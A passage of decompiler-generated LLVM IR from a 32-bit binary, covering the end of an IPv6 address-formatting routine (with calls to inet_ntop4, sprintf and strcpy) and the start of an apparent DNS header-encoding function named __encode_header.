  %v1_804d580.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d55d

dec_label_pc_804d589:                             ; preds = %dec_label_pc_804d55d
  %v4_804d547 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d593.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d593

dec_label_pc_804d593:                             ; preds = %dec_label_pc_804d589, %dec_label_pc_804d5c0
  %v0_804d5c071 = phi i32 [ 0, %dec_label_pc_804d589 ], [ %v1_804d5c0, %dec_label_pc_804d5c0 ]
  %v0_804d5ab70 = phi i32 [ -1, %dec_label_pc_804d589 ], [ %v0_804d5ab8, %dec_label_pc_804d5c0 ]
  %v0_804d5cb69 = phi i32 [ -1, %dec_label_pc_804d589 ], [ %v0_804d5b09, %dec_label_pc_804d5c0 ]
  %v0_804d5d668 = phi i32 [ -1, %dec_label_pc_804d589 ], [ %v0_804d5bb13, %dec_label_pc_804d5c0 ]
  %v2_804d593 = mul nuw nsw i32 %v0_804d5c071, 4
  %v3_804d593 = add nuw nsw i32 %v2_804d593, 60
  %v4_804d593 = add i32 %v3_804d593, %v0_804d593.pre
  %v5_804d593 = inttoptr i32 %v4_804d593 to i32*
  %v6_804d593 = load i32, i32* %v5_804d593, align 4
  %v7_804d593 = icmp eq i32 %v6_804d593, 0
  %v1_804d598 = icmp eq i1 %v7_804d593, false
  %v10_804d5ab = icmp eq i32 %v0_804d5ab70, -1
  br i1 %v1_804d598, label %dec_label_pc_804d5ab, label %dec_label_pc_804d59a

dec_label_pc_804d59a:                             ; preds = %dec_label_pc_804d593
  %v1_804d59d = icmp eq i1 %v10_804d5ab, false
  br i1 %v1_804d59d, label %dec_label_pc_804d5a8, label %dec_label_pc_804d59f

dec_label_pc_804d59f:                             ; preds = %dec_label_pc_804d59a
  store i32 %v0_804d5c071, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d5c0

dec_label_pc_804d5a8:                             ; preds = %dec_label_pc_804d59a
  %v0_804d5a8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d5a8 = add i32 %v0_804d5a8, 1
  store i32 %v1_804d5a8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d5c0

dec_label_pc_804d5ab:                             ; preds = %dec_label_pc_804d593
  br i1 %v10_804d5ab, label %dec_label_pc_804d5c0, label %dec_label_pc_804d5b0

dec_label_pc_804d5b0:                             ; preds = %dec_label_pc_804d5ab
  %v10_804d5b0 = icmp eq i32 %v0_804d5cb69, -1
  %v0_804d5b9.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d5b5 = load i32, i32* @ebp, align 4
  %v7_804d5b7 = icmp sgt i32 %v0_804d5b9.pre, %v1_804d5b5
  %or.cond = or i1 %v10_804d5b0, %v7_804d5b7
  br i1 %or.cond, label %dec_label_pc_804d5b9, label %dec_label_pc_804d5bd

dec_label_pc_804d5b9:                             ; preds = %dec_label_pc_804d5b0
  store i32 %v0_804d5b9.pre, i32* @ebp, align 4
  store i32 %v0_804d5d668, i32* @edi, align 4
  br label %dec_label_pc_804d5bd

dec_label_pc_804d5bd:                             ; preds = %dec_label_pc_804d5b0, %dec_label_pc_804d5b9
  %v0_804d5b011 = phi i32 [ %v0_804d5d668, %dec_label_pc_804d5b9 ], [ %v0_804d5cb69, %dec_label_pc_804d5b0 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5c0

dec_label_pc_804d5c0:                             ; preds = %dec_label_pc_804d5ab, %dec_label_pc_804d5a8, %dec_label_pc_804d59f, %dec_label_pc_804d5bd
  %v0_804d5bb13 = phi i32 [ %v0_804d5d668, %dec_label_pc_804d5ab ], [ %v0_804d5d668, %dec_label_pc_804d5a8 ], [ %v0_804d5c071, %dec_label_pc_804d59f ], [ -1, %dec_label_pc_804d5bd ]
  %v0_804d5ab8 = phi i32 [ -1, %dec_label_pc_804d5ab ], [ %v0_804d5ab70, %dec_label_pc_804d5a8 ], [ %v0_804d5c071, %dec_label_pc_804d59f ], [ -1, %dec_label_pc_804d5bd ]
  %v0_804d5b09 = phi i32 [ %v0_804d5cb69, %dec_label_pc_804d5ab ], [ %v0_804d5cb69, %dec_label_pc_804d5a8 ], [ %v0_804d5cb69, %dec_label_pc_804d59f ], [ %v0_804d5b011, %dec_label_pc_804d5bd ]
  %v1_804d5c0 = add nuw nsw i32 %v0_804d5c071, 1
  store i32 %v1_804d5c0, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_804d5c0, 8
  br i1 %exitcond, label %dec_label_pc_804d5c6, label %dec_label_pc_804d593

dec_label_pc_804d5c6:                             ; preds = %dec_label_pc_804d5c0
  %v10_804d5c6 = icmp eq i32 %v0_804d5bb13, -1
  br i1 %v10_804d5c6, label %dec_label_pc_804d5d8, label %dec_label_pc_804d5cb

dec_label_pc_804d5cb:                             ; preds = %dec_label_pc_804d5c6
  %v10_804d5cb = icmp eq i32 %v0_804d5b09, -1
  %v0_804d5d4.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_804d5cb, label %dec_label_pc_804d5d4, label %dec_label_pc_804d5d0

dec_label_pc_804d5d0:                             ; preds = %dec_label_pc_804d5cb
  %v1_804d5d0 = load i32, i32* @ebp, align 4
  %v7_804d5d2 = icmp sgt i32 %v0_804d5d4.pre, %v1_804d5d0
  br i1 %v7_804d5d2, label %dec_label_pc_804d5d4, label %dec_label_pc_804d5d8.thread

dec_label_pc_804d5d8.thread:                      ; preds = %dec_label_pc_804d5d0
  br label %dec_label_pc_804d5dd

dec_label_pc_804d5d4:                             ; preds = %dec_label_pc_804d5cb, %dec_label_pc_804d5d0
  store i32 %v0_804d5d4.pre, i32* @ebp, align 4
  store i32 %v0_804d5bb13, i32* @edi, align 4
  br label %dec_label_pc_804d5d8

dec_label_pc_804d5d8:                             ; preds = %dec_label_pc_804d5c6, %dec_label_pc_804d5d4
  %v0_804d5d8 = phi i32 [ %v0_804d5b09, %dec_label_pc_804d5c6 ], [ %v0_804d5bb13, %dec_label_pc_804d5d4 ]
  %v10_804d5d8 = icmp eq i32 %v0_804d5d8, -1
  br i1 %v10_804d5d8, label %dec_label_pc_804d5e5, label %dec_label_pc_804d5d8.dec_label_pc_804d5dd_crit_edge

dec_label_pc_804d5d8.dec_label_pc_804d5dd_crit_edge: ; preds = %dec_label_pc_804d5d8
  %v0_804d5dd.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d5dd

dec_label_pc_804d5dd:                             ; preds = %dec_label_pc_804d5d8.dec_label_pc_804d5dd_crit_edge, %dec_label_pc_804d5d8.thread
  %v0_804d5dd = phi i32 [ %v1_804d5d0, %dec_label_pc_804d5d8.thread ], [ %v0_804d5dd.pre, %dec_label_pc_804d5d8.dec_label_pc_804d5dd_crit_edge ]
  %v0_804d5d849 = phi i32 [ %v0_804d5b09, %dec_label_pc_804d5d8.thread ], [ %v0_804d5d8, %dec_label_pc_804d5d8.dec_label_pc_804d5dd_crit_edge ]
  %v1_804d5dd = add i32 %v0_804d5dd, -1
  %v6_804d5dd = sub i32 0, %v0_804d5dd
  %v7_804d5dd = and i32 %v0_804d5dd, %v6_804d5dd
  %v8_804d5dd = icmp slt i32 %v7_804d5dd, 0
  %v9_804d5dd = icmp eq i32 %v1_804d5dd, 0
  %v10_804d5dd = icmp slt i32 %v1_804d5dd, 0
  %v3_804d5e0 = icmp eq i1 %v10_804d5dd, %v8_804d5dd
  %v4_804d5e0 = icmp eq i1 %v9_804d5dd, false
  %v5_804d5e0 = and i1 %v4_804d5e0, %v3_804d5e0
  br i1 %v5_804d5e0, label %dec_label_pc_804d5e5, label %dec_label_pc_804d5e2

dec_label_pc_804d5e2:                             ; preds = %dec_label_pc_804d5dd
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804d5e5

dec_label_pc_804d5e5:                             ; preds = %dec_label_pc_804d5dd, %dec_label_pc_804d5d8, %dec_label_pc_804d5e2
  %v0_804d68518 = phi i32 [ %v0_804d5d849, %dec_label_pc_804d5dd ], [ -1, %dec_label_pc_804d5d8 ], [ -1, %dec_label_pc_804d5e2 ]
  %v2_804d5e5 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_804d5e5, i32* @ebx, align 4
  %v3_804d667 = add i32 %v4_804d547, 64
  %v12_804d625 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_804d68561 = icmp eq i32 %v0_804d68518, -1
  %v1_804d62d = icmp eq i1 %v12_804d625, false
  br label %dec_label_pc_804d5f0

dec_label_pc_804d5f0:                             ; preds = %dec_label_pc_804d5e5, %dec_label_pc_804d67b
  %v10_804d68567 = phi i1 [ %v10_804d68561, %dec_label_pc_804d5e5 ], [ %v10_804d685, %dec_label_pc_804d67b ]
  %v0_804d60a66 = phi i32 [ 0, %dec_label_pc_804d5e5 ], [ %v1_804d67b, %dec_label_pc_804d67b ]
  %v1_804d60065 = phi i32 [ %v0_804d68518, %dec_label_pc_804d5e5 ], [ %v0_804d685.pre, %dec_label_pc_804d67b ]
  %v0_804d60e64 = phi i32 [ %v2_804d5e5, %dec_label_pc_804d5e5 ], [ %v0_804d60419, %dec_label_pc_804d67b ]
  %stack_var_-120.163 = phi i8* [ null, %dec_label_pc_804d5e5 ], [ %stack_var_-120.0, %dec_label_pc_804d67b ]
  %stack_var_-116.162 = phi i32 [ 32, %dec_label_pc_804d5e5 ], [ %stack_var_-116.0, %dec_label_pc_804d67b ]
  br i1 %v10_804d68567, label %dec_label_pc_804d60a, label %dec_label_pc_804d5f5

dec_label_pc_804d5f5:                             ; preds = %dec_label_pc_804d5f0
  %v12_804d5f5 = icmp eq i32 %v0_804d60a66, %v1_804d60065
  %v5_804d5f7 = icmp slt i32 %v0_804d60a66, %v1_804d60065
  br i1 %v5_804d5f7, label %dec_label_pc_804d60a, label %dec_label_pc_804d5f9

dec_label_pc_804d5f9:                             ; preds = %dec_label_pc_804d5f5
  %v1_804d5f9 = load i32, i32* @ebp, align 4
  %v2_804d5f9 = add i32 %v1_804d5f9, %v1_804d60065
  store i32 %v2_804d5f9, i32* %eax.global-to-local, align 4
  %v5_804d5fe = icmp slt i32 %v0_804d60a66, %v2_804d5f9
  br i1 %v5_804d5fe, label %dec_label_pc_804d600, label %dec_label_pc_804d60a

dec_label_pc_804d600:                             ; preds = %dec_label_pc_804d5f9
  %v1_804d602 = icmp eq i1 %v12_804d5f5, false
  br i1 %v1_804d602, label %dec_label_pc_804d67b, label %dec_label_pc_804d604

dec_label_pc_804d604:                             ; preds = %dec_label_pc_804d600
  %v1_804d604 = inttoptr i32 %v0_804d60e64 to i8*
  store i8 58, i8* %v1_804d604, align 1
  %v0_804d607 = load i32, i32* @ebx, align 4
  %v1_804d607 = add i32 %v0_804d607, 1
  store i32 %v1_804d607, i32* @ebx, align 4
  br label %dec_label_pc_804d67b

dec_label_pc_804d60a:                             ; preds = %dec_label_pc_804d5f9, %dec_label_pc_804d5f5, %dec_label_pc_804d5f0
  %v1_804d60a = icmp eq i32 %v0_804d60a66, 0
  br i1 %v1_804d60a, label %dec_label_pc_804d612.thread, label %dec_label_pc_804d612

dec_label_pc_804d612.thread:                      ; preds = %dec_label_pc_804d60a
  br label %dec_label_pc_804d666

dec_label_pc_804d612:                             ; preds = %dec_label_pc_804d60a
  %v1_804d60e = inttoptr i32 %v0_804d60e64 to i8*
  store i8 58, i8* %v1_804d60e, align 1
  %v0_804d611 = load i32, i32* @ebx, align 4
  %v1_804d611 = add i32 %v0_804d611, 1
  store i32 %v1_804d611, i32* @ebx, align 4
  %v0_804d612.pre = load i32, i32* @esi, align 4
  %v9_804d612 = icmp eq i32 %v0_804d612.pre, 6
  %v1_804d615 = icmp eq i1 %v9_804d612, false
  br i1 %v1_804d615, label %dec_label_pc_804d666, label %dec_label_pc_804d617

dec_label_pc_804d617:                             ; preds = %dec_label_pc_804d612
  %v0_804d617 = load i32, i32* @edi, align 4
  %v1_804d617 = icmp eq i32 %v0_804d617, 0
  %v1_804d619 = icmp eq i1 %v1_804d617, false
  br i1 %v1_804d619, label %dec_label_pc_804d666, label %dec_label_pc_804d61b

dec_label_pc_804d61b:                             ; preds = %dec_label_pc_804d617
  %v0_804d61b = load i32, i32* @ebp, align 4
  %v9_804d61b = icmp eq i32 %v0_804d61b, 6
  br i1 %v9_804d61b, label %dec_label_pc_804d62f, label %dec_label_pc_804d620

dec_label_pc_804d620:                             ; preds = %dec_label_pc_804d61b
  %v9_804d620 = icmp eq i32 %v0_804d61b, 5
  %v1_804d623 = icmp eq i1 %v9_804d620, false
  br i1 %v1_804d623, label %dec_label_pc_804d666, label %dec_label_pc_804d625

dec_label_pc_804d625:                             ; preds = %dec_label_pc_804d620
  br i1 %v1_804d62d, label %dec_label_pc_804d666, label %dec_label_pc_804d62f

dec_label_pc_804d62f:                             ; preds = %dec_label_pc_804d625, %dec_label_pc_804d61b
  %v2_804d635 = sub i32 %v1_804d611, %v2_804d5e5
  store i32 %v2_804d635, i32* @esi, align 4
  %v2_804d640 = sub i32 46, %v2_804d635
  store i32 %v2_804d640, i32* @ecx, align 4
  %v1_804d642 = add i32 %arg2, 12
  store i32 %v1_804d642, i32* @eax, align 4
  store i32 %v1_804d611, i32* @edx, align 4
  %v0_804d647 = load i8*, i8** %stack_var_-124, align 4
  %v1_804d647 = ptrtoint i8* %v0_804d647 to i32
  %v3_804d647 = ptrtoint i8* %stack_var_-120.163 to i32
  %v5_804d647 = call i32 @inet_ntop4(i32 %v1_804d647, i32 %v3_804d647, i32 %stack_var_-116.162)
  store i32 %v5_804d647, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804d64e = icmp eq i32 %v5_804d647, 0
  br i1 %v1_804d64e, label %dec_label_pc_804d6d8, label %dec_label_pc_804d656

dec_label_pc_804d656:                             ; preds = %dec_label_pc_804d62f
  %v0_804d659 = load i32, i32* @ebx, align 4
  %v5_804d659 = inttoptr i32 %v0_804d659 to i8*
  store i8* %v5_804d659, i8** %stack_var_-124, align 4
  %v3_804d65a = call i32 @strlen(i8* %v5_804d659)
  store i32 %v3_804d65a, i32* %eax.global-to-local, align 4
  %v0_804d662 = load i32, i32* @ebx, align 4
  %v3_804d662 = add i32 %v0_804d662, %v3_804d65a
  store i32 %v3_804d662, i32* @ebx, align 4
  %v0_804d68a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d68a

dec_label_pc_804d666:                             ; preds = %dec_label_pc_804d612.thread, %dec_label_pc_804d625, %dec_label_pc_804d620, %dec_label_pc_804d617, %dec_label_pc_804d612
  %v1_804d66754 = phi i32 [ 0, %dec_label_pc_804d612.thread ], [ %v0_804d612.pre, %dec_label_pc_804d625 ], [ %v0_804d612.pre, %dec_label_pc_804d620 ], [ %v0_804d612.pre, %dec_label_pc_804d617 ], [ %v0_804d612.pre, %dec_label_pc_804d612 ]
  %v0_804d67053 = phi i32 [ %v0_804d60e64, %dec_label_pc_804d612.thread ], [ %v1_804d611, %dec_label_pc_804d625 ], [ %v1_804d611, %dec_label_pc_804d620 ], [ %v1_804d611, %dec_label_pc_804d617 ], [ %v1_804d611, %dec_label_pc_804d612 ]
  %v0_804d666 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804d666, i32* %stack_var_-112, align 4
  %v2_804d667 = mul i32 %v1_804d66754, 4
  %v4_804d667 = add i32 %v3_804d667, %v2_804d667
  %v5_804d667 = inttoptr i32 %v4_804d667 to i32*
  %v6_804d667 = load i32, i32* %v5_804d667, align 4
  %v5_804d670 = inttoptr i32 %v0_804d67053 to i8*
  store i8* %v5_804d670, i8** %stack_var_-124, align 4
  %v6_804d671 = call i32 @sprintf(i32 %v0_804d67053, i32 ptrtoint ([3 x i8]* @global_var_8050639.109 to i32), i32 %v6_804d667, i32 %v0_804d666)
  store i32 %v6_804d671, i32* %eax.global-to-local, align 4
  %v0_804d679 = load i32, i32* @ebx, align 4
  %v2_804d679 = add i32 %v0_804d679, %v6_804d671
  store i32 %v2_804d679, i32* @ebx, align 4
  br label %dec_label_pc_804d67b

dec_label_pc_804d67b:                             ; preds = %dec_label_pc_804d600, %dec_label_pc_804d604, %dec_label_pc_804d666
  %stack_var_-116.0 = phi i32 [ %v6_804d667, %dec_label_pc_804d666 ], [ %stack_var_-116.162, %dec_label_pc_804d600 ], [ %stack_var_-116.162, %dec_label_pc_804d604 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050639.109, i32 0, i32 0), %dec_label_pc_804d666 ], [ %stack_var_-120.163, %dec_label_pc_804d600 ], [ %stack_var_-120.163, %dec_label_pc_804d604 ]
  %v0_804d60419 = phi i32 [ %v2_804d679, %dec_label_pc_804d666 ], [ %v0_804d60e64, %dec_label_pc_804d600 ], [ %v1_804d607, %dec_label_pc_804d604 ]
  %v0_804d67b = load i32, i32* @esi, align 4
  %v1_804d67b = add i32 %v0_804d67b, 1
  %v0_804d685.pre = load i32, i32* @edi, align 4
  store i32 %v1_804d67b, i32* @esi, align 4
  %v7_804d67f = icmp sgt i32 %v1_804d67b, 7
  %v10_804d685 = icmp eq i32 %v0_804d685.pre, -1
  br i1 %v7_804d67f, label %dec_label_pc_804d685, label %dec_label_pc_804d5f0

dec_label_pc_804d685:                             ; preds = %dec_label_pc_804d67b
  br i1 %v10_804d685, label %dec_label_pc_804d696, label %dec_label_pc_804d68a

dec_label_pc_804d68a:                             ; preds = %dec_label_pc_804d685, %dec_label_pc_804d656
  %v0_804d692 = phi i32 [ %v0_804d60419, %dec_label_pc_804d685 ], [ %v3_804d662, %dec_label_pc_804d656 ]
  %v0_804d68a = phi i32 [ %v0_804d685.pre, %dec_label_pc_804d685 ], [ %v0_804d68a.pre, %dec_label_pc_804d656 ]
  %v1_804d68a = load i32, i32* @ebp, align 4
  %v2_804d68a = add i32 %v1_804d68a, %v0_804d68a
  store i32 %v2_804d68a, i32* %eax.global-to-local, align 4
  %v9_804d68d = icmp eq i32 %v2_804d68a, 8
  %v1_804d690 = icmp eq i1 %v9_804d68d, false
  br i1 %v1_804d690, label %dec_label_pc_804d696, label %dec_label_pc_804d692

dec_label_pc_804d692:                             ; preds = %dec_label_pc_804d68a
  %v1_804d692 = inttoptr i32 %v0_804d692 to i8*
  store i8 58, i8* %v1_804d692, align 1
  %v0_804d695 = load i32, i32* @ebx, align 4
  %v1_804d695 = add i32 %v0_804d695, 1
  store i32 %v1_804d695, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d696

dec_label_pc_804d696:                             ; preds = %dec_label_pc_804d68a, %dec_label_pc_804d685, %dec_label_pc_804d692
  %v0_804d69a = phi i32 [ %v0_804d692, %dec_label_pc_804d68a ], [ %v0_804d60419, %dec_label_pc_804d685 ], [ %v1_804d695, %dec_label_pc_804d692 ]
  store i32 %v2_804d5e5, i32* %edx.global-to-local, align 4
  %v1_804d69a = add i32 %v0_804d69a, 1
  store i32 %v1_804d69a, i32* %eax.global-to-local, align 4
  %v1_804d69d = inttoptr i32 %v0_804d69a to i8*
  store i8 0, i8* %v1_804d69d, align 1
  %v0_804d6a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d6a0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d6a0 = sub i32 %v0_804d6a0, %v1_804d6a0
  store i32 %v2_804d6a0, i32* @eax, align 4
  %tmp78 = icmp ugt i32 %v2_804d6a0, %arg4
  br i1 %tmp78, label %dec_label_pc_804d6a8, label %dec_label_pc_804d6b5

dec_label_pc_804d6a8:                             ; preds = %dec_label_pc_804d696
  %v0_804d6a8 = load i8*, i8** %stack_var_-124, align 4
  %v1_804d6a8 = ptrtoint i8* %v0_804d6a8 to i32
  %v2_804d6a8 = call i32 @__errno_location(i32 %v1_804d6a8)
  store i32 %v2_804d6a8, i32* %eax.global-to-local, align 4
  %v1_804d6ad = inttoptr i32 %v2_804d6a8 to i32*
  store i32 28, i32* %v1_804d6ad, align 4
  br label %dec_label_pc_804d6d6

dec_label_pc_804d6b5:                             ; preds = %dec_label_pc_804d696
  %v0_804d6b5 = load i32, i32* @edi, align 4
  store i32 %v0_804d6b5, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_804d6b82 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_804d6b82, i32* %tmp46, align 4
  %v0_804d6bf.cast = inttoptr i32 %v3_804d6b82 to i8*
  %v5_804d6bf = call i32 @strcpy(i8* %v0_804d6bf.cast, i32 %v2_804d5e5)
  store i32 %v5_804d6bf, i32* %eax.global-to-local, align 4
  store i32 %v5_804d6bf, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d6d8

dec_label_pc_804d6cb:                             ; preds = %dec_label_pc_804d524
  %v1_804d6cb = call i32 @__errno_location(i32 %v0_804d517)
  store i32 %v1_804d6cb, i32* %eax.global-to-local, align 4
  %v1_804d6d0 = inttoptr i32 %v1_804d6cb to i32*
  store i32 97, i32* %v1_804d6d0, align 4
  br label %dec_label_pc_804d6d6

dec_label_pc_804d6d6:                             ; preds = %dec_label_pc_804d6a8, %dec_label_pc_804d6cb
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d6d8

dec_label_pc_804d6d8:                             ; preds = %dec_label_pc_804d62f, %dec_label_pc_804d52f, %dec_label_pc_804d6b5, %dec_label_pc_804d6d6
  %v0_804d6db = phi i32 [ 0, %dec_label_pc_804d62f ], [ %v3_804d53b, %dec_label_pc_804d52f ], [ %v5_804d6bf, %dec_label_pc_804d6b5 ], [ 0, %dec_label_pc_804d6d6 ]
  store i32 %v0_804d6db, i32* %eax.global-to-local, align 4
  store i32 %v0_804d517, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d6db

; uselistorder directives
  uselistorder i32 %v0_804d6db, { 1, 0 }
  uselistorder i32 %v0_804d69a, { 1, 0 }
  uselistorder i32 %v1_804d67b, { 1, 0, 2 }
  uselistorder i32 %v0_804d67053, { 1, 0 }
  uselistorder i32 %v0_804d612.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804d611, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.162, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.163, { 2, 1, 0 }
  uselistorder i32 %v0_804d60e64, { 2, 3, 1, 0 }
  uselistorder i32 %v1_804d60065, { 2, 0, 1 }
  uselistorder i32 %v0_804d60a66, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804d5e5, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804d5dd, { 1, 0 }
  uselistorder i32 %v0_804d5dd, { 1, 2, 0 }
  uselistorder i32 %v1_804d5c0, { 0, 2, 1 }
  uselistorder i32 %v0_804d5b09, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d5bb13, { 0, 2, 1, 3 }
  uselistorder i1 %v10_804d5ab, { 1, 0 }
  uselistorder i32 %v0_804d5d668, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804d5cb69, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804d5c071, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_804d57b72, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_804d517, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 0, 1, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 6, 7, 2, 4, 0, 3, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 11, 12, 13, 16, 14, 15, 17, 19, 18, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 97, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @strcpy, { 3, 0, 1, 2 }
  uselistorder [3 x i8]* @global_var_8050639.109, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 15, { 0, 4, 5, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804d6d8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d6d6, { 1, 0 }
  uselistorder label %dec_label_pc_804d696, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d67b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d666, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804d5f0, { 1, 0 }
  uselistorder label %dec_label_pc_804d5e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d5d8, { 1, 0 }
  uselistorder label %dec_label_pc_804d5d4, { 1, 0 }
  uselistorder label %dec_label_pc_804d5c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d5bd, { 1, 0 }
  uselistorder label %dec_label_pc_804d593, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_3()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d6e5 = load i32, i32* @ebx, align 4
  store i32 %v0_804d6e5, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_804d6ed = ptrtoint i8* %tmp8 to i32
  store i32 %v4_804d6ed, i32* %esi.global-to-local, align 4
  %v7_804d6f6 = icmp sgt i32 %tmp, 11
  br i1 %v7_804d6f6, label %dec_label_pc_804d6fc, label %dec_label_pc_804d792

dec_label_pc_804d6fc:                             ; preds = %entry
  %v1_804d6fc = add i32 %tmp9, 1
  %v2_804d6fc = inttoptr i32 %v1_804d6fc to i8*
  %v3_804d6fc = load i8, i8* %v2_804d6fc, align 1
  store i8 %v3_804d6fc, i8* %tmp8, align 1
  %v0_804d702 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d702 = inttoptr i32 %v0_804d702 to i32*
  %v2_804d702 = load i32, i32* %v1_804d702, align 4
  %v1_804d704 = trunc i32 %v2_804d702 to i8
  %v2_804d704 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d704 = add i32 %v2_804d704, 1
  %v4_804d704 = inttoptr i32 %v3_804d704 to i8*
  store i8 %v1_804d704, i8* %v4_804d704, align 1
  %v0_804d72a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d72a = add i32 %v0_804d72a, 8
  %v2_804d72a = inttoptr i32 %v1_804d72a to i32*
  %v3_804d72a = load i32, i32* %v2_804d72a, align 4
  %v1_804d72d = mul i32 %v3_804d72a, 8
  %v2_804d733 = or i32 %v1_804d72d, 4
  %v1_804d735 = add i32 %v0_804d72a, 20
  %v2_804d735 = inttoptr i32 %v1_804d735 to i32*
  %v3_804d735 = load i32, i32* %v2_804d735, align 4
  %v4_804d735 = icmp eq i32 %v3_804d735, 0
  %v1_804d739 = icmp eq i1 %v4_804d735, false
  %v2_804d739 = zext i1 %v1_804d739 to i32
  %v2_804d73c = or i32 %v2_804d739, %v2_804d733
  %v2_804d73e = or i32 %v2_804d73c, -126
  %v5_804d73e = trunc i32 %v2_804d73e to i8
  store i32 %v2_804d73e, i32* @ecx, align 4
  %v2_804d740 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d740 = add i32 %v2_804d740, 2
  %v4_804d740 = inttoptr i32 %v3_804d740 to i8*
  store i8 %v5_804d73e, i8* %v4_804d740, align 1
  %v0_804d743 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d749 = add i32 %v0_804d743, 28
  %v2_804d749 = inttoptr i32 %v1_804d749 to i8*
  %v3_804d749 = load i8, i8* %v2_804d749, align 1
  %tmp13 = urem i8 %v3_804d749, 16
  %v2_804d754 = or i8 %tmp13, -128
  %v2_804d756 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d756 = add i32 %v2_804d756, 3
  %v4_804d756 = inttoptr i32 %v3_804d756 to i8*
  store i8 %v2_804d754, i8* %v4_804d756, align 1
  %v0_804d759 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d759 = add i32 %v0_804d759, 33
  %v2_804d759 = inttoptr i32 %v1_804d759 to i8*
  %v3_804d759 = load i8, i8* %v2_804d759, align 1
  %v2_804d75d = load i32, i32* %esi.global-to-local, align 4
  %v3_804d75d = add i32 %v2_804d75d, 4
  %v4_804d75d = inttoptr i32 %v3_804d75d to i8*
  store i8 %v3_804d759, i8* %v4_804d75d, align 1
  %v0_804d760 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d760 = add i32 %v0_804d760, 32
  %v2_804d760 = inttoptr i32 %v1_804d760 to i32*
  %v3_804d760 = load i32, i32* %v2_804d760, align 4
  %v1_804d763 = trunc i32 %v3_804d760 to i8
  %v2_804d763 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d763 = add i32 %v2_804d763, 5
  %v4_804d763 = inttoptr i32 %v3_804d763 to i8*
  store i8 %v1_804d763, i8* %v4_804d763, align 1
  %v0_804d766 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d766 = add i32 %v0_804d766, 37
  %v2_804d766 = inttoptr i32 %v1_804d766 to i8*
  %v3_804d766 = load i8, i8* %v2_804d766, align 1
  %v2_804d76a = load i32, i32* %esi.global-to-local, align 4
